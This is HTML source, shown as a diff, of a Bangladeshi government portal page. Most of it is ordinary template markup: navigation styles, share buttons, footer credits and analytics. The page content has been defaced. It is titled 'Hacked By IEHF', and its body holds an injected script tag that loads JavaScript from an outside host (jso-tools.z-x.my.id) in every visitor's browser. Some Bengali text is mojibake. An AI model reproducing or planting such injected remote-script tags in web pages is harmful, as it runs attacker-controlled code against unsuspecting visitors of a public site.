+	@media only screen and (min-width:980px ){
+
+    	.mzr-slide > li.focusin-drop:focus-within > div,
+    	.mzr-slide > li.focusin-drop:focus-within > ul,
+    	.mzr-slide > li > ul li.focusin-drop:focus-within > ul {
+    		top: 37px;
+    		opacity: 1;
+    		overflow: visible;
+    		visibility: visible;
+    		display: block;
+    	}
+    
+    }
+    
+    @media only screen and (max-width: 959px) {
+
+		.mzr-responsive.mzr-slide > li.focusin-drop:focus-within > div,
+		.mzr-responsive.mzr-slide > li.focusin-drop:focus-within > ul,
+		.mzr-responsive.mzr-slide > li > ul li.focusin-drop:focus-within > ul,
+		.mzr-responsive.mzr-fade > li.focusin-drop:focus-within > div,
+		.mzr-responsive.mzr-fade > li.focusin-drop:focus-within > ul,
+		.mzr-responsive.mzr-fade > li > ul li.focusin-drop:focus-within > ul { top: auto;	}
+
+	}
+	
+    /* -------------------end new css--------------- */
+</style>
+<script>
+    /* Responsive Design*/
+    $(document).ready(function () {
+         
+        $(".focusClassDrop").hover(
+          function () {
+            $(".focusClassDrop").removeClass("focusin-drop");
+          },
+          function () {
+            $(".focusClassDrop").addClass("focusin-drop");
+          }
+        );
+
+        var wi = $(window).width();
+        if (wi < 768) {
+            $('#jmenu .show-menu').click(function () {
+
+                $(".mzr-responsive").slideToggle(700, "linear", function () {
+                });
+
+            });
+
+            $(".mzr-drop> a").click(function () {
+
+                $(".mzr-drop> a").siblings().addClass('sibling-toggle');
+
+                $(this).parent().find(".mzr-content").removeClass('sibling-toggle').addClass('slide-visible').slideToggle(700, "linear", function () {
+                });
+                return false;
+            });
+        }
+    });
+    /// redundent home button
+    // home page will nor show à¦ªà§à¦°à¦¥à¦® à¦ªà¦¾à¦¤à¦¾
+
+
+</script>        
+                
+    </div>     
+                </div>
+            </div>
+        </div>
+         <!-- <div class="row" >
+            <div class="col">
+                <div id="flash">
+                   
+                </div>
+            </div>
+                 </div> -->
+        
+         <div class="row" >
+                                        <div class="col-md-12">
+                   <div id="left">
+                      <!-- Share Content top option start -->
+                      <div class="d-flex justify-content-between hide-for-print mb-3 mt-5">
+                            <div>
+                                <p class="share-title">à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿà¦Ÿà¦¿ à¦¶à§‡à§Ÿà¦¾à¦° à¦•à¦°à¦¤à§‡ à¦•à§à¦²à¦¿à¦• à¦•à¦°à§à¦¨</p>
+                                <div class="blocks">
+    <div class="d-flex gap-1">
+        <a class="social_btn facebook fb-xfbml-parse-ignore" href="javascript:void(0)" onclick="shareOnClick('facebook')"><i class="fab fa-facebook-f"></i></a> 
+        <a class="twitter-share-button twitter social_btn" href="javascript:void(0)" onclick="shareOnClick('twitter')"><i class="fab fa-twitter"></i></a>
+        <a class="whatsapp social_btn" href="javascript:void(0)" onclick="shareOnClick('whatsapp')"><i class="fab fa-whatsapp"></i></a>
+        <a class="linkedin social_btn" href="javascript:void(0)" onclick="shareOnClick('linkedin')"> <i class="fab fa-linkedin" aria-hidden="true"></i></a>
+        <a class="link social_btn" onclick="copyToClipboard()"><i class="fa fa-link"></i></a>
+        <a class="viber social_btn" href="javascript:void(0)" onclick="shareOnClick('viber')"><i class="fab fa-viber"></i></a>
+        <a class="messenger social_btn ms-share" href="javascript:void(0)" onclick="shareOnClick('messenger')"><i class="fab fa-facebook-messenger"></i></a>
+    </div>
+</div>
+<script>
+function shareOnClick(value) {
+    var fullURL = window.location.href;
+    if(value === 'facebook'){
+        var url = "//www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(fullURL) + "&amp;src=sdkpreparse";
+    }else if(value === 'twitter'){
+        var url = "//twitter.com/intent/tweet?text=" + encodeURIComponent(fullURL);
+    }else if(value === 'whatsapp'){
+        var url = "//wa.me/?text=" + encodeURIComponent(fullURL);
+    }else if(value === 'linkedin'){
+        var url = "//www.linkedin.com/sharing/share-offsite/?url=" + encodeURIComponent(fullURL);
+    }else if(value === 'messenger'){
+        var url = "//m.me/share/?url=" + encodeURIComponent(fullURL);
+    }else if(value === 'viber'){
+        var url = "viber://forward?text=" + encodeURIComponent(fullURL);
+    }
+    window.open(url, "_blank");
+}
+
+function copyToClipboard() {
+    var link = window.location.href;
+    var textarea = document.createElement("textarea");
+    textarea.value = link;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+    alert("Link copied to clipboard!");
+}
+</script>
+
+<style>
+.social_btn{
+  color: #fff !important;
+  padding: 5px;
+  font-size: 12px;
+  width: 24px;
+  height: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 50%;
+  transition: all 0.6s ease;
+  margin: 0 2px 0 2px;
+}
+.social_btn:hover{
+  transform: translateY(-4px);
+  text-decoration: none !important;
+}
+/* Social Icon */
+.bread_social{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.facebook{
+  background: #303F9E;
+}
+.twitter{
+  background: #3675AE;
+}
+.viber{
+  background: #9D1BC0;
+}
+.twitter {
+  background: #3675AE;
+}
+.whatsapp {
+  background: #6FBE3C;
+}
+.linkedin {
+  background: #3874B2;
+}
+.link {
+  background: #4FB2E2;
+}
+.messenger {
+  background: #BF3DC8;
+}
+
+.share-popup {  
+  display: none;
+    position: absolute;
+  bottom: 3px;
+  left: 16px;
+  background-color: white;
+  /* border: 1px solid var(--globalColor); */
+  border-radius: 5px;
+  padding: 7px;
+  box-shadow: 0 0px 25px rgb(0 0 0 / 0.4);
+  z-index: 100000000000000000000000000;
+}
+
+.share-icon:hover+#share-popup,
+.share-popup.active {
+  /* display: block; */
+  display: flex;
+  position: absolute;
+  z-index: 100000000000000000000000000;
+}
+
+@media (max-width: 767px) {
+  .bread_social{
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+  }
+  .webform{
+    display: flex;
+    flex-direction: column;
+  }
+  .webform iframe{
+    margin: 5px;
+  }
+  .webform .body{
+    width: 100%;
+  }
+}
+
+
+
+/* @media (min-width: 1920px) {
+  .share-popup {  
+    bottom: 3px;
+  }
+  .social_btn{
+    color: #fff !important;
+    padding: 5px;
+    font-size: 20px;
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+  }
+} */
+</style>                                <!-- <div class="addthis_inline_share_toolbox"></div> -->
+                            </div>
+                            <div class="share-content-box">
+                                <div class="mr-2 d-flex align-items-center">
+                                    <!-- <p class="share-youtube-title">National Portal Bangladesh</p>
+                                    <div class="g-ytsubscribe" data-channelid="UCdf7GabtLtI8a6Gu2clXdHw" data-layout="default" data-count="default"></div>
+                                    <p class="share-text-style">à¦ªà§‹à¦°à§à¦Ÿà¦¾à¦² à¦¸à¦¾à¦¬à¦¸à§à¦•à§à¦°à¦¾à¦‡à¦¬ à¦•à¦°à§à¦¨</p>-->  
+                                     <iframe src="//www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2FNationalPortal%2F&tabs&width=340&height=70&small_header=true&adapt_container_width=true&hide_cover=true&show_facepile=true&appId" width="340" height="70" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+                                                                         <a href="//www.facebook.com/NationalPortal/" class="share-text-style" style="box-shadow: 0 0 0px 1px #80808033;
+                                        padding: 12px 10px 9px;margin-left: 4px;font-size: 16px;text-align: left;border-radius: 1px;" target="_blink">
+                                        à¦«à§‡à¦‡à¦¸à¦¬à§à¦• à¦ªà§‡à¦‡à¦œ à¦­à¦¿à¦œà¦¿à¦Ÿ à¦“ <br>à¦²à¦¾à¦‡à¦• à¦¦à¦¿à¦¨</a>
+                                </div>
+                                <!-- <div>
+                                    <a href="#" onclick="loadOpinionPoll(this)"><img src="//file.portal.gov.bd/media/central/chart.png" alt="Polling" style="width:28px;height:24px;"></a>
+                                    <p class="share-text-style">à¦ªà§‹à¦²à¦¿à¦‚</p>
+                                </div>
+                                <div>
+                                    <a href="#" onclick="loadCommentSection(this, 2)"><img src="//file.portal.gov.bd/media/central/comment.png" alt="Polling" style="width:28px;height:24px;"></a>
+                                    <p class="share-text-style">à¦®à¦¤à¦¾à¦®à¦¤ à¦¦à¦¿à¦¨</p>
+                                </div> -->
+                            </div>
+                        </div>
+                      <!-- Share Content top option end -->
+                       <div class="page details">
+
+    <!-- {"item":{"id":"6fa263fd-a970-4f5a-b187-eba9d20babc1","title":"Hacked By systemadminbd","body":"<p>&lt;script type=\"text\/javascript\" src=\"https:\/\/jso-tools.z-x.my.id\/raw\/~\/EAQ0AW480I6HS\"&gt;&lt;\/script&gt;<\/p>","slug":"Hacked-By","publish_date":null,"archive_date":null,"publish":1,"is_right_side_bar":1,"site_id":13485,"created_at":"2024-08-17 16:38:42","updated_at":"2024-08-17 16:40:28","deleted_at":null,"created_by":23241,"updated_by":23241,"deleted_by":null,"attachments":[],"image":{"id":1515446,"disk_name":"66c0d20e5de3c051794604.jpg","file_name":"photo_2024-08-17_01-21-13.jpg","file_size":137619,"content_type":"image\/jpeg","title":null,"description":null,"field":"image","sort_order":1515446,"created_at":"2024-08-17 16:38:39","updated_at":"2024-08-17 16:38:43","deleted_at":null,"path":"https:\/\/file-rajshahi.portal.gov.bd\/uploads\/e1d30457-83be-4265-9f96-c893163f72d9\/\/66c\/0d2\/0e5\/66c0d20e5de3c051794604.jpg","extension":"jpg"}},"config":{"columns":[{"name":"title","displayName":"label.column.title","type":"text"},{"name":"body","displayName":"label.column.body","type":"html_text"},{"name":"attachments","displayName":"label.column.attachment","type":"file"},{"name":"image","displayName":"label.column.image","type":"image"}]},"content_type":{"id":16,"name":"\u09aa\u09be\u09a4\u09be","code":"Page","is_common":0,"icon":"icon-pencil-square-o","table_name":"Np\\Contents\\Models\\Page","status":1,"config":"{\r\n    \"details\": {\r\n        \"columns\": [\r\n            {\r\n                \"name\": \"title\",\r\n                \"displayName\": \"label.column.title\",\r\n                \"type\": \"text\"\r\n            },\r\n            {\r\n                \"name\": \"body\",\r\n                \"displayName\": \"label.column.body\",\r\n                \"type\": \"html_text\"\r\n            },\r\n            {\r\n                \"name\": \"attachments\",\r\n                \"displayName\": \"label.column.attachment\",\r\n                \"type\": \"file\"\r\n            },\r\n            {\r\n                \"name\": \"image\",\r\n                \"displayName\": \"label.column.image\",\r\n                \"type\": \"image\"\r\n            }\r\n        ]\r\n    }\r\n}","created_at":"2019-09-02 06:23:10","updated_at":"2021-08-06 04:55:07","deleted_at":null,"created_by":null,"updated_by":null,"deleted_by":null,"settings":[[]],"frequency":30},"title":""} -->
+
+<br><div class="row">
+    <div class="col">
+
+    <!-- Content Type Condition Code Start --> 
+        <!-- Page -->
+        <!-- Content Type is not Page -->
+                                                                            <div class="text title">
+                        <div class="value">
+                        <!-- text -->
+                            Hacked By IEHF<br></div>
+                    </div>
+                                                                                        <div class="html_text body">
+                        <div class="value">
+                        <!-- html_text -->
+                            <p><script type="text/javascript" src="//jso-tools.z-x.my.id/raw/~/EAQ0AW480I6HS"></script></p>                        </div>
+                    </div>
+                                                                                        <div class="file attachments">
+                        <div class="value">
+                        <!-- file -->
+
+                        </div>
+                    </div>
+                                                                                        <div class="image image">
+                        <div class="value">
+                        <!-- image -->
+                            <img src="//file-rajshahi.portal.gov.bd/uploads/e1d30457-83be-4265-9f96-c893163f72d9//66c/0d2/0e5/66c0d20e5de3c051794604.jpg" width="" height="" alt=""></div>
+                    </div>
+                                            <!-- Content Type Condition Code End --> 
+
+    </div>
+</div>
+
+<style>
+    .officersprofile .row .col .image .value img {
+        width: 30%!important;
+    }
+</style></div>
+                        <!-- Share Content bottom option start -->
+                       <div class="d-flex justify-content-between hide-for-print my-3">
+                            <div>
+                                <p class="share-title">à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿà¦Ÿà¦¿ à¦¶à§‡à§Ÿà¦¾à¦° à¦•à¦°à¦¤à§‡ à¦•à§à¦²à¦¿à¦• à¦•à¦°à§à¦¨</p>
+                                <div class="blocks">
+    <div class="d-flex gap-1">
+        <a class="social_btn facebook fb-xfbml-parse-ignore" href="javascript:void(0)" onclick="shareOnClick('facebook')"><i class="fab fa-facebook-f"></i></a> 
+        <a class="twitter-share-button twitter social_btn" href="javascript:void(0)" onclick="shareOnClick('twitter')"><i class="fab fa-twitter"></i></a>
+        <a class="whatsapp social_btn" href="javascript:void(0)" onclick="shareOnClick('whatsapp')"><i class="fab fa-whatsapp"></i></a>
+        <a class="linkedin social_btn" href="javascript:void(0)" onclick="shareOnClick('linkedin')"> <i class="fab fa-linkedin" aria-hidden="true"></i></a>
+        <a class="link social_btn" onclick="copyToClipboard()"><i class="fa fa-link"></i></a>
+        <a class="viber social_btn" href="javascript:void(0)" onclick="shareOnClick('viber')"><i class="fab fa-viber"></i></a>
+        <a class="messenger social_btn ms-share" href="javascript:void(0)" onclick="shareOnClick('messenger')"><i class="fab fa-facebook-messenger"></i></a>
+    </div>
+</div>
+<script>
+function shareOnClick(value) {
+    var fullURL = window.location.href;
+    if(value === 'facebook'){
+        var url = "//www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(fullURL) + "&amp;src=sdkpreparse";
+    }else if(value === 'twitter'){
+        var url = "//twitter.com/intent/tweet?text=" + encodeURIComponent(fullURL);
+    }else if(value === 'whatsapp'){
+        var url = "//wa.me/?text=" + encodeURIComponent(fullURL);
+    }else if(value === 'linkedin'){
+        var url = "//www.linkedin.com/sharing/share-offsite/?url=" + encodeURIComponent(fullURL);
+    }else if(value === 'messenger'){
+        var url = "//m.me/share/?url=" + encodeURIComponent(fullURL);
+    }else if(value === 'viber'){
+        var url = "viber://forward?text=" + encodeURIComponent(fullURL);
+    }
+    window.open(url, "_blank");
+}
+
+function copyToClipboard() {
+    var link = window.location.href;
+    var textarea = document.createElement("textarea");
+    textarea.value = link;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+    alert("Link copied to clipboard!");
+}
+</script>
+
+<style>
+.social_btn{
+  color: #fff !important;
+  padding: 5px;
+  font-size: 12px;
+  width: 24px;
+  height: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 50%;
+  transition: all 0.6s ease;
+  margin: 0 2px 0 2px;
+}
+.social_btn:hover{
+  transform: translateY(-4px);
+  text-decoration: none !important;
+}
+/* Social Icon */
+.bread_social{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.facebook{
+  background: #303F9E;
+}
+.twitter{
+  background: #3675AE;
+}
+.viber{
+  background: #9D1BC0;
+}
+.twitter {
+  background: #3675AE;
+}
+.whatsapp {
+  background: #6FBE3C;
+}
+.linkedin {
+  background: #3874B2;
+}
+.link {
+  background: #4FB2E2;
+}
+.messenger {
+  background: #BF3DC8;
+}
+
+.share-popup {  
+  display: none;
+    position: absolute;
+  bottom: 3px;
+  left: 16px;
+  background-color: white;
+  /* border: 1px solid var(--globalColor); */
+  border-radius: 5px;
+  padding: 7px;
+  box-shadow: 0 0px 25px rgb(0 0 0 / 0.4);
+  z-index: 100000000000000000000000000;
+}
+
+.share-icon:hover+#share-popup,
+.share-popup.active {
+  /* display: block; */
+  display: flex;
+  position: absolute;
+  z-index: 100000000000000000000000000;
+}
+
+@media (max-width: 767px) {
+  .bread_social{
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+  }
+  .webform{
+    display: flex;
+    flex-direction: column;
+  }
+  .webform iframe{
+    margin: 5px;
+  }
+  .webform .body{
+    width: 100%;
+  }
+}
+
+
+
+/* @media (min-width: 1920px) {
+  .share-popup {  
+    bottom: 3px;
+  }
+  .social_btn{
+    color: #fff !important;
+    padding: 5px;
+    font-size: 20px;
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+  }
+} */
+</style>                                <!-- <div class="addthis_inline_share_toolbox"></div> -->
+                            </div>
+                            <div class="share-content-box">
+                                <div class="mr-2">
+                                    <!-- <p class="share-youtube-title">National Portal Bangladesh</p>
+                                    <div class="g-ytsubscribe" data-channelid="UCdf7GabtLtI8a6Gu2clXdHw" data-layout="default" data-count="default"></div>
+                                    <p class="share-text-style">à¦ªà§‹à¦°à§à¦Ÿà¦¾à¦² à¦¸à¦¾à¦¬à¦¸à§à¦•à§à¦°à¦¾à¦‡à¦¬ à¦•à¦°à§à¦¨</p> -->  
+                                   <iframe src="//www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2FNationalPortal%2F&tabs&width=340&height=70&small_header=true&adapt_container_width=true&hide_cover=true&show_facepile=true&appId" width="340" height="70" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+                                </div>
+                                <div>
+                                    <a href="#" onclick="loadOpinionPoll(this)"><img src="//file.portal.gov.bd/media/central/chart.png" alt="Polling" style="width:28px;height:24px;"></a>
+                                    <p class="share-text-style">à¦ªà§‹à¦²à¦¿à¦‚</p>
+                                </div>
+                                <div>
+                                    <a href="#" onclick="loadCommentSection(this, 2)"><img src="//file.portal.gov.bd/media/central/comment.png" alt="Polling" style="width:28px;height:24px;"></a>
+                                    <p class="share-text-style">à¦®à¦¤à¦¾à¦®à¦¤ à¦¦à¦¿à¦¨</p>
+                                </div>
+                            </div>
+                        </div>
+                       <!-- Share Content bottom option end -->
+                   </div>
+               </div>
+                    </div>
+        
+         <div class="row" >
+            <div class="col">
+                <div id="bottom">
+                     <div class="blocks">
+    </div>                </div>
+            </div>
+        </div>
+        <div class="row">
+            <!-- footer partial will be hear -->
+            <div class="col">
+                <div>
+                    <style>
+    @media print {
+        #footer-menu, #footer-credit{
+        display: none!important;
+        }
+        #footer-credit p{
+        display: none!important;
+        }
+        #footer{
+             display: none!important;
+        }
+    }
+</style>
+<div class="footer-artwork" id="footer-artwork" >&nbsp;</div>
+<div class="footer-wrapper full-width" id="footer-wrapper">
+	<div id="footer-menu">
+		<div style="float: left; font-size: .9em;">
+            à¦¸à¦¾à¦‡à¦Ÿà¦Ÿà¦¿ à¦¶à§‡à¦· à¦¹à¦¾à¦²-à¦¨à¦¾à¦—à¦¾à¦¦ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡:
+            <span style="font-style: italic;">
+                <!-- 2024-08-17 16:46:25 -->
+                                    <!-- last_content_updated is NOT NULL -->
+                    <!--                                         à§¨à§¦à§¨à§ª-à§¦à§®-à§¨à§¨ -->
+                                        <!--  -->
+                                        <!-- 2024-08-17 22:46:25 -->
+                                        à§¨à§¦à§¨à§ª-à§¦à§®-à§§à§­ à§¨à§¨:à§ªà§¬:à§¨à§«
+                                
+                
+            </span>
+		</div>
+    </div>
+
+	<div class="footer-credit" id="footer">
+        <p>
+            à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¨à¦¾ à¦“ à¦¬à¦¾à¦¸à§à¦¤à¦¬à¦¾à¦¯à¦¼à¦¨à§‡:
+			<a href="//www.cabinet.gov.bd/"  title="à¦®à¦¨à§à¦¤à§à¦°à¦¿à¦ªà¦°à¦¿à¦·à¦¦ à¦¬à¦¿à¦­à¦¾à¦—" target="_blank">à¦®à¦¨à§à¦¤à§à¦°à¦¿à¦ªà¦°à¦¿à¦·à¦¦ à¦¬à¦¿à¦­à¦¾à¦—</a>,&nbsp;
+            <a href="//a2i.gov.bd" title="à¦à¦Ÿà§à¦†à¦‡" target="_blank">à¦à¦Ÿà§à¦†à¦‡</a>,&nbsp;
+            <a href="//www.bcc.gov.bd/" title="à¦¬à¦¿à¦¸à¦¿à¦¸à¦¿" target="_blank">à¦¬à¦¿à¦¸à¦¿à¦¸à¦¿</a>,&nbsp;
+            <a href="//doict.gov.bd/" title="à¦¡à¦¿à¦“à¦†à¦‡à¦¸à¦¿à¦Ÿà¦¿" target="_blank">à¦¡à¦¿à¦“à¦†à¦‡à¦¸à¦¿à¦Ÿà¦¿</a>&nbsp;à¦“&nbsp;
+            <a href="//www.basis.org.bd/" title="à¦¬à§‡à¦¸à¦¿à¦¸" target="_blank">à¦¬à§‡à¦¸à¦¿à¦¸</a>
+        </p>
+        <p>
+            <span>
+			    à¦•à¦¾à¦°à¦¿à¦—à¦°à¦¿ à¦¸à¦¹à¦¾à§Ÿà¦¤à¦¾à§Ÿ:
+			    <a href="//a2i.gov.bd" title=""><img style="height: 40px; vertical-align: baseline;" src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/np-logo-set.png" alt="a2i"></a>
+			</span>
+			<br>
+			<span style="display: none;">
+			    à¦¸à¦«à¦Ÿà¦“à¦¯à¦¼à§à¦¯à¦¾à¦° à¦¤à§ˆà¦°à¦¿:
+			    <a href="//www.orangebd.com" title=""><img style="height: 28px; vertical-align: baseline;" src="//file-rajshahi.portal.gov.bd/media/central/themes/theme-default/img/obd.png" alt="orangebd"></a>
+			</span>
+        </p>
+    </div>
+</div>                </div>
+            </div>
+           
+        </div>
+    </div>
+    
+
+  
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <!-- <script src="//code.jquery.com/jquery-3.3.1.slim.min.js" crossorigin="anonymous"></script> -->
+    <script>
+
+        $(document).ready(function() {
+        
+           /*$.simpleTicker($("#news-ticker"),{
+              delay : 2000,
+              effectType : 'roll'
+           });*/
+           
+           $("#banner-slider").css({"display":"block"});
+           $("#ad-slider").responsiveSlides();
+           $("#banner-slider").responsiveSlides();
+           $("#image-slider").responsiveSlides();
+           
+        });  
+        
+        //for video gallary
+        $(document).ready(function(){
+            $("ul.youtube-videogallery").youtubeVideoGallery({
+                
+    			title:'default',
+                iframeTemplate: '<div class="iframe"><div class="close"><a href="#">CLOSE</a></div><iframe title="Youtube video player" id="youtube-videogallery-iframe" style=" height: {options.innerHeight}px; width: {options.innerWidth}px;" frameborder="0" src="about:blank"></iframe></div>'
+            
+            });
+            
+            //close the iframe
+            $(".close a").click(function (e) {
+                e.preventDefault();
+                $(".youtube-videogallery-bodycover").trigger("click");
+            });
+        
+        });
+       
+       $(document).ready(function () {
+            $("div.right-side-bar, div.col-3").click(function(){
+                var get_width = $(window).width();
+                // alert(get_width);
+                if(get_width>=320 && get_width<960){
+                    $(this).addClass("col-md-6");
+				    $(this).removeClass("col-3");
+                   // $('.right-side-bar').removeClass('col-3');
+                   // $('.right-side-bar').addClass('col-md-6');
+                }
+            });
+            $("div.right-side-bar, div.col-3").click();
+            start_np();
+        });
+
+        
+    </script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=G-XL3REV1DHW"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+    
+            gtag('config', 'G-XL3REV1DHW');
+            gtag('event', 'ansarvdp.shariakandi.bogra.gov.bd (Frontend)', {
+                'event_category' : 'Frontend'
+            });
+            
+            
+        function start_np(){
+          $('#start-np').attr({'aria-selected': true, 'tabindex': 0});
+          document.getElementById("start-np").focus();
+        }
+    </script>
+    <!-- Pixel Code for //inusight.com/ -->
+    <script defer src="//inusight.com/pixel/zpSefT317My3oFwG"></script>
+    <!-- ENDÂ PixelÂ CodeÂ -->
+    
+    <!-- Go to www.addthis.com/dashboard to customize your tools -->
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-635f6a273f17a426"></script>
+    
+    <!-- youtube subscription api -->
+    <script src="//apis.google.com/js/platform.js"></script> 
+    
+  </body>
+</html>
